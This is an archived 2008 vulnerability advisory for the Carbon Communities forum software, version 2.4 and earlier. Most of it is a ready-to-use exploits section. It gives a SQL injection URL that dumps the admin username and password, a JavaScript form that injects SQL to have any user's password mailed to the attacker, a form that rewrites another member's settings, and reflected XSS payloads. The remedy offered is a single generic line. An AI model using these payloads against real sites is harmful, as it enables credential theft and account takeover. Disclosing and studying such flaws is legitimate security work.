<html><head><title>Carbon Communities <= 2.4 Multiple Remote Vulnerabilities</title></head><pre>########################## www.BugReport.ir #######################################
#
#      AmnPardaz Security Research Team
#
# Title: Multiple Vulnerabilities in Carbon Communities forum.
# Vendor: www.carboncommunities.com
# Vulnerable Version: 2.4 and prior versions
# Exploit: Available
# Impact: High
# Fix: N/A
# Original Advisory: http://bugreport.ir/index.php?/35
###################################################################################


####################
1. Description:
####################
Carbon Communities is a high powered, fully scalable, and highly customizable online portal, message boards/ bulletin board, discussion hub, Private messaging, Event Calendars, Emails and chat software rolled into one.

####################
2. Vulnerability:
####################
    2.1. There is a SQL Injection in &quot;events.asp?id=[Injection]&quot;. By using it, attacker can gain usernames and passwords.
        2.1.1. POC:
                Check exploits section.
    2.2. There is a SQL Injection in &quot;getpassword.asp&quot;. By using it, attacker can send any password to his/her email address.(exploit available)
        2.2.1. POC:
                Check exploits section.
    2.3. There is a SQL Injection in &quot;option_Update.asp&quot;. By using it, attacker can update member info.(exploit available)
        2.3.1. POC:
                Check exploits section.
    2.4. There are some XSS in &quot;login.asp&quot; and &quot;member_send.asp&quot;.
        2.4.1. POC:
                /login.asp?Redirect='&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;fake a='
                /member_send.asp?OrderBy='&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;fake a='
####################
3. Exploits:
####################

 Original Exploit URL: http://bugreport.ir/index.php?/35/exploit

 3.1. Attacker can gain usernames and passwords:
    -------------
        http://[CarbonCommunitiesURL]/events.asp?ID=-1 union all select 1,1,1,'Username= '%2bmember_name%2b'&lt;br&gt;Password= '%2bmember_password,1,1,1,1,1,1,1 from tbl_Members where member_name = 'admin'
    -------------
 3.2. Attacker can send any password to his/her email address:
     -------------
        &lt;script language=&quot;javascript&quot;&gt;
            function check(){
                document.getElementById(&quot;UserName&quot;).value = &quot;1' or uCase(Member_Name)='&quot;+ document.getElementById(&quot;UserName&quot;).value
            }
        &lt;/script&gt;
        &lt;form action=&quot;http://[CarbonCommunitiesURL]/getpassword.asp&quot; method=&quot;post&quot; onsubmit=&quot;check()&quot;&gt;
        UserName: &lt;input type=&quot;text&quot; name=&quot;UserName&quot; id=&quot;UserName&quot; value=&quot;default&quot; size=&quot;100&quot; /&gt;
        &lt;br /&gt;
        EMail: &lt;input type=&quot;text&quot; name=&quot;EMail&quot; value=&quot;Your Email Address&quot; size=&quot;100&quot; /&gt;
        &lt;br /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
    -------------
 3.3. Attacker can update member info.:
    -------------
        &lt;form action=&quot;http://[CarbonCommunitiesURL]/option_Update.asp?Action=edit&quot; method=&quot;post&quot;&gt;
        ID&lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;1&quot;/&gt;
        &lt;br /&gt;
        Member_Cookies&lt;input type=&quot;text&quot; name=&quot;Member_Cookies&quot; value=&quot;Yes&quot; /&gt;
        &lt;br /&gt;
        Member_SystemCookies&lt;input type=&quot;text&quot; name=&quot;Member_SystemCookies&quot; value=&quot;Yes&quot; /&gt;
        &lt;br /&gt;
        Member_Center&lt;input type=&quot;text&quot; name=&quot;Member_Center&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_EmailTheadResponse&lt;input type=&quot;text&quot; name=&quot;Member_EmailTheadResponse&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_EmailPostResponse&lt;input type=&quot;text&quot; name=&quot;Member_EmailPostResponse&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_WeekStart&lt;input type=&quot;text&quot; name=&quot;Member_WeekStart&quot; value=&quot;0&quot; /&gt;
        &lt;br /&gt;
        Member_ThreadDays&lt;input type=&quot;text&quot; name=&quot;Member_ThreadDays&quot; value=&quot;0&quot; /&gt;
        &lt;br /&gt;
        Member_ThreadView&lt;input type=&quot;text&quot; name=&quot;Member_ThreadView&quot; value=&quot;0&quot; /&gt;
        &lt;br /&gt;
        Member_Invisible&lt;input type=&quot;text&quot; name=&quot;Member_Invisible&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_HiddenEmail&lt;input type=&quot;text&quot; name=&quot;Member_HiddenEmail&quot; value=&quot;0&quot; /&gt;
        &lt;br /&gt;
        Member_ReceivePM&lt;input type=&quot;text&quot; name=&quot;Member_ReceivePM&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_PMEmailNotice&lt;input type=&quot;text&quot; name=&quot;Member_PMEmailNotice&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_PMPopup&lt;input type=&quot;text&quot; name=&quot;Member_PMPopup&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        Member_Newsletter&lt;input type=&quot;text&quot; name=&quot;Member_Newsletter&quot; value=&quot;0&quot; /&gt;
        &lt;br /&gt;
        Member_TimeZone&lt;input type=&quot;text&quot; name=&quot;Member_TimeZone&quot; value=&quot;0&quot; /&gt;
        &lt;br /&gt;
        Member_DefaultColor&lt;input type=&quot;text&quot; name=&quot;Member_DefaultColor&quot; value=&quot;1&quot; /&gt;
        &lt;br /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
    -------------
####################
4. Solution:
####################
    Edit the source code to ensure that inputs are properly sanitised.
####################
- Credit :
####################
AmnPardaz Security Research &amp; Penetration Testing Group
Contact: admin[4t}bugreport{d0t]ir
WwW.BugReport.ir
WwW.AmnPardaz.com

# milw0rm.com [2008-04-16]</pre></html>